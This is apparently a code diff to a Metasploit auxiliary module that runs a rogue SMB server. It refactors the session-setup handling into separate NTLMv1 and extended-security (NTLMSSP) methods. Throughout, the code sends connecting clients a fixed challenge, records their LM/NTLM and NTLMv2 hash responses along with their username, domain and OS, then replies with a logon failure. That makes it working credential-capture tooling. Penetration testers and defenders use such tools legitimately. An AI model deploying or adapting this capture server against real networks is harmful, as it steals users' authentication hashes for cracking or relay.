@@ -122,11 +122,11 @@ class Metasploit3 < Msf::Auxiliary
       #CIFS SMB_COM_SESSION_SETUP_ANDX request without smb extended security
       #This packet contains the lm/ntlm hashes
       if wordcount == 0x0D
-        smb_cmd_session_setup(c, buff, false)
+        smb_cmd_session_setup(c, buff)
         #CIFS SMB_COM_SESSION_SETUP_ANDX request with smb extended security
         # can be of type NTLMSS_NEGOCIATE or NTLMSSP_AUTH,
       elsif wordcount == 0x0C
-        smb_cmd_session_setup(c, buff, true)
+        smb_cmd_session_setup_with_esn(c, buff)
       else
         print_status("SMB Capture - #{smb[:ip]} Unknown SMB_COM_SESSION_SETUP_ANDX request type , ignoring... ")
         smb_error(cmd, c, CONST::SMB_STATUS_SUCCESS, @s_smb_esn)
@@ -200,205 +200,203 @@ class Metasploit3 < Msf::Auxiliary
     c.put(pkt.to_s)
   end
 
-  def smb_cmd_session_setup(c, buff, esn)
+  def smb_cmd_session_setup(c, buff)
     smb = @state[c]
 
-    # extended security has been negotiated
-    if esn
-      pkt = CONST::SMB_SETUP_NTLMV2_PKT.make_struct
-      pkt.from_s(buff)
+    pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
+    pkt.from_s(buff)
 
-      securityblobLen = pkt['Payload'].v['SecurityBlobLen']
-      blob = pkt['Payload'].v['Payload'][0,securityblobLen]
+    lm_len = pkt['Payload'].v['PasswordLenLM'] # Always 24
+    nt_len = pkt['Payload'].v['PasswordLenNT']
 
-      #detect if GSS is being used
-      if blob[0,7] == 'NTLMSSP'
-        c_gss = false
-      else
-        c_gss = true
-        start = blob.index('NTLMSSP')
-        if start
-          blob.slice!(0,start)
-        else
-          print_status("SMB Capture - Error finding NTLM in SMB_COM_SESSION_SETUP_ANDX request from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
-          smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
-          return
-        end
-
-      end
-      ntlm_message = NTLM_MESSAGE::parse(blob)
-
-      case ntlm_message
-      when NTLM_MESSAGE::Type1
-        #Send Session Setup AndX Response NTLMSSP_CHALLENGE response packet
-
-        if (ntlm_message.flag & NTLM_CONST::NEGOTIATE_NTLM2_KEY) != 0
-          c_ntlm_esn = true
-        else
-          c_ntlm_esn = false
-        end
-        pkt = CONST::SMB_SETUP_NTLMV2_RES_PKT.make_struct
-        pkt.from_s(buff)
-        smb_set_defaults(c, pkt)
-
-        pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
-        pkt['Payload']['SMB'].v['ErrorClass'] = CONST::SMB_STATUS_MORE_PROCESSING_REQUIRED
-        pkt['Payload']['SMB'].v['Flags1'] = 0x88
-        pkt['Payload']['SMB'].v['Flags2'] = 0xc807
-        pkt['Payload']['SMB'].v['WordCount'] = 4
-        pkt['Payload']['SMB'].v['UserID'] = 2050
-        pkt['Payload'].v['AndX'] = 0xFF
-        pkt['Payload'].v['Reserved1'] = 0x00
-        pkt['Payload'].v['AndXOffset'] = 283 #ignored by client
-        pkt['Payload'].v['Action'] = 0x0000
-
-        win_domain = Rex::Text.to_unicode(@domain_name.upcase)
-        win_name = Rex::Text.to_unicode(@domain_name.upcase)
-        dns_domain = Rex::Text.to_unicode(@domain_name.downcase)
-        dns_name = Rex::Text.to_unicode(@domain_name.downcase)
-
-        #create the ntlmssp_challenge security blob
-        if c_ntlm_esn && @s_ntlm_esn
-          sb_flag = 0xe28a8215 # ntlm2
-        else
-          sb_flag = 0xe2828215 #no ntlm2
-        end
-        if c_gss
-          securityblob = NTLM_UTILS::make_ntlmssp_secblob_chall(
-            win_domain,
-            win_name,
-            dns_domain,
-            dns_name,
-            @challenge,
-            sb_flag
-          )
-        else
-          securityblob = NTLM_UTILS::make_ntlmssp_blob_chall(
-            win_domain,
-            win_name,
-            dns_domain,
-            dns_name,
-            @challenge,
-            sb_flag
-          )
-        end
-        pkt['Payload'].v['SecurityBlobLen'] = securityblob.length
-        pkt['Payload'].v['Payload'] = securityblob
-
-        c.put(pkt.to_s)
-
-      when NTLM_MESSAGE::Type3
-        #we can process the hash and send a status_logon_failure response packet
-
-        # Record the remote multiplex ID
-        smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
-        lm_len = ntlm_message.lm_response.length # Always 24
-        nt_len = ntlm_message.ntlm_response.length
-
-        if nt_len == 24 # lmv1/ntlmv1 or ntlm2_session
-          arg = {
-            :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
-            :lm_hash => ntlm_message.lm_response.unpack('H*')[0],
-            :nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
-          }
-
-          if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
-            arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
-          end
-        # if the length of the ntlm response is not 24 then it will be
-        # bigger and represent an NTLMv2 response
-        elsif nt_len > 24 # lmv2/ntlmv2
-          arg = {
-            :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE,
-            :lm_hash => ntlm_message.lm_response[0, 16].unpack('H*')[0],
-            :lm_cli_challenge => ntlm_message.lm_response[16, 8].unpack('H*')[0],
-            :nt_hash => ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
-            :nt_cli_challenge => ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]
-          }
-        elsif nt_len == 0
-          print_status("SMB Capture - Empty hash from #{smb[:name]} - #{smb[:ip]} captured, ignoring ... ")
-          smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
-          return
-        else
-          print_status("SMB Capture - Unknown hash type from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
-          smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
-          return
-        end
-
-        buff = pkt['Payload'].v['Payload']
-        buff.slice!(0,securityblobLen)
-        names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
-
-        smb[:username] = ntlm_message.user
-        smb[:domain]   = ntlm_message.domain
-        smb[:peer_os]  = names[0]
-        smb[:peer_lm]  = names[1]
-
-        begin
-          smb_get_hash(smb,arg,true)
-        rescue ::Exception => e
-          print_error("SMB Capture - Error processing Hash from #{smb[:name]} - #{smb[:ip]} : #{e.class} #{e} #{e.backtrace}")
-        end
-        smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
-      else
-        smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
-      end
-
-    # if not, we can get the hash and send a status_access_denied response packet
-    else
-
-      pkt = CONST::SMB_SETUP_NTLMV1_PKT.make_struct
-      pkt.from_s(buff)
-
-      lm_len = pkt['Payload'].v['PasswordLenLM'] # Always 24
-      nt_len = pkt['Payload'].v['PasswordLenNT']
-
-      if nt_len == 24
-        arg = {
-          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
-          :lm_hash => pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0],
-          :nt_hash => pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]
-        }
+    if nt_len == 24
+      arg = {
+        :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+        :lm_hash => pkt['Payload'].v['Payload'][0, lm_len].unpack("H*")[0],
+        :nt_hash => pkt['Payload'].v['Payload'][lm_len, nt_len].unpack("H*")[0]
+      }
       # if the length of the ntlm response is not 24 then it will be bigger
       # and represent an NTLMv2 response
-      elsif nt_len > 24
+    elsif nt_len > 24
+      arg = {
+        :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE,
+        :lm_hash => pkt['Payload'].v['Payload'][0, 16].unpack("H*")[0],
+        :lm_cli_challenge => pkt['Payload'].v['Payload'][16, 8].unpack("H*")[0],
+        :nt_hash => pkt['Payload'].v['Payload'][lm_len, 16].unpack("H*")[0],
+        :nt_cli_challenge => pkt['Payload'].v['Payload'][lm_len + 16, nt_len - 16].unpack("H*")[0]
+      }
+    elsif nt_len == 0
+      print_status("SMB Capture - Empty hash captured from #{smb[:name]} - #{smb[:ip]} captured, ignoring ... ")
+      smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+      return
+    else
+      print_status("SMB Capture - Unknown hash type capture from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
+      smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+      return
+    end
+
+    buff = pkt['Payload'].v['Payload']
+    buff.slice!(0, lm_len + nt_len)
+    names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
+
+    smb[:username] = names[0]
+    smb[:domain]   = names[1]
+    smb[:peer_os]  = names[2]
+    smb[:peer_lm]  = names[3]
+
+    begin
+      smb_get_hash(smb,arg,false)
+    rescue ::Exception => e
+      print_error("SMB Capture - Error processing Hash from #{smb[:name]} : #{e.class} #{e} #{e.backtrace}")
+    end
+
+    smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+
+  end
+
+  def smb_cmd_session_setup_with_esn(c, buff)
+    smb = @state[c]
+
+    pkt = CONST::SMB_SETUP_NTLMV2_PKT.make_struct
+    pkt.from_s(buff)
+
+    securityblobLen = pkt['Payload'].v['SecurityBlobLen']
+    blob = pkt['Payload'].v['Payload'][0,securityblobLen]
+
+    # detect if GSS is being used
+    if blob[0,7] == 'NTLMSSP'
+      c_gss = false
+    else
+      c_gss = true
+      start = blob.index('NTLMSSP')
+      if start
+        blob.slice!(0,start)
+      else
+        print_status("SMB Capture - Error finding NTLM in SMB_COM_SESSION_SETUP_ANDX request from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
+        smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
+        return
+      end
+
+    end
+    ntlm_message = NTLM_MESSAGE::parse(blob)
+
+    case ntlm_message
+    when NTLM_MESSAGE::Type1
+      # Send Session Setup AndX Response NTLMSSP_CHALLENGE response packet
+
+      if (ntlm_message.flag & NTLM_CONST::NEGOTIATE_NTLM2_KEY) != 0
+        c_ntlm_esn = true
+      else
+        c_ntlm_esn = false
+      end
+      pkt = CONST::SMB_SETUP_NTLMV2_RES_PKT.make_struct
+      pkt.from_s(buff)
+      smb_set_defaults(c, pkt)
+
+      pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
+      pkt['Payload']['SMB'].v['ErrorClass'] = CONST::SMB_STATUS_MORE_PROCESSING_REQUIRED
+      pkt['Payload']['SMB'].v['Flags1'] = 0x88
+      pkt['Payload']['SMB'].v['Flags2'] = 0xc807
+      pkt['Payload']['SMB'].v['WordCount'] = 4
+      pkt['Payload']['SMB'].v['UserID'] = 2050
+      pkt['Payload'].v['AndX'] = 0xFF
+      pkt['Payload'].v['Reserved1'] = 0x00
+      pkt['Payload'].v['AndXOffset'] = 283 #ignored by client
+      pkt['Payload'].v['Action'] = 0x0000
+
+      win_domain = Rex::Text.to_unicode(@domain_name.upcase)
+      win_name = Rex::Text.to_unicode(@domain_name.upcase)
+      dns_domain = Rex::Text.to_unicode(@domain_name.downcase)
+      dns_name = Rex::Text.to_unicode(@domain_name.downcase)
+
+      # create the ntlmssp_challenge security blob
+      if c_ntlm_esn && @s_ntlm_esn
+        sb_flag = 0xe28a8215 # ntlm2
+      else
+        sb_flag = 0xe2828215 # no ntlm2
+      end
+      if c_gss
+        securityblob = NTLM_UTILS::make_ntlmssp_secblob_chall(
+          win_domain,
+          win_name,
+          dns_domain,
+          dns_name,
+          @challenge,
+          sb_flag
+        )
+      else
+        securityblob = NTLM_UTILS::make_ntlmssp_blob_chall(
+          win_domain,
+          win_name,
+          dns_domain,
+          dns_name,
+          @challenge,
+          sb_flag
+        )
+      end
+      pkt['Payload'].v['SecurityBlobLen'] = securityblob.length
+      pkt['Payload'].v['Payload'] = securityblob
+
+      c.put(pkt.to_s)
+
+    when NTLM_MESSAGE::Type3
+      #we can process the hash and send a status_logon_failure response packet
+
+      # Record the remote multiplex ID
+      smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
+      lm_len = ntlm_message.lm_response.length # Always 24
+      nt_len = ntlm_message.ntlm_response.length
+
+      if nt_len == 24 # lmv1/ntlmv1 or ntlm2_session
+        arg = {
+          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+          :lm_hash => ntlm_message.lm_response.unpack('H*')[0],
+          :nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
+        }
+
+        if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
+          arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
+        end
+        # if the length of the ntlm response is not 24 then it will be
+        # bigger and represent an NTLMv2 response
+      elsif nt_len > 24 # lmv2/ntlmv2
         arg = {
           :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE,
-          :lm_hash => pkt['Payload'].v['Payload'][0, 16].unpack("H*")[0],
-          :lm_cli_challenge => pkt['Payload'].v['Payload'][16, 8].unpack("H*")[0],
-          :nt_hash => pkt['Payload'].v['Payload'][lm_len, 16].unpack("H*")[0],
-          :nt_cli_challenge => pkt['Payload'].v['Payload'][lm_len + 16, nt_len - 16].unpack("H*")[0]
+          :lm_hash => ntlm_message.lm_response[0, 16].unpack('H*')[0],
+          :lm_cli_challenge => ntlm_message.lm_response[16, 8].unpack('H*')[0],
+          :nt_hash => ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
+          :nt_cli_challenge => ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]
         }
       elsif nt_len == 0
-        print_status("SMB Capture - Empty hash captured from #{smb[:name]} - #{smb[:ip]} captured, ignoring ... ")
+        print_status("SMB Capture - Empty hash from #{smb[:name]} - #{smb[:ip]} captured, ignoring ... ")
         smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
         return
       else
-        print_status("SMB Capture - Unknown hash type capture from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
+        print_status("SMB Capture - Unknown hash type from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
         smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
         return
       end
 
       buff = pkt['Payload'].v['Payload']
-      buff.slice!(0, lm_len + nt_len)
+      buff.slice!(0,securityblobLen)
       names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
 
-      smb[:username] = names[0]
-      smb[:domain]   = names[1]
-      smb[:peer_os]  = names[2]
-      smb[:peer_lm]  = names[3]
+      smb[:username] = ntlm_message.user
+      smb[:domain]   = ntlm_message.domain
+      smb[:peer_os]  = names[0]
+      smb[:peer_lm]  = names[1]
 
       begin
-        smb_get_hash(smb,arg,false)
+        smb_get_hash(smb,arg,true)
       rescue ::Exception => e
-        print_error("SMB Capture - Error processing Hash from #{smb[:name]} : #{e.class} #{e} #{e.backtrace}")
+        print_error("SMB Capture - Error processing Hash from #{smb[:name]} - #{smb[:ip]} : #{e.class} #{e} #{e.backtrace}")
       end
-
       smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
-
+    else
+      smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
     end
-
   end
+
 
   def smb_get_hash(smb, arg = {}, esn=true)
 
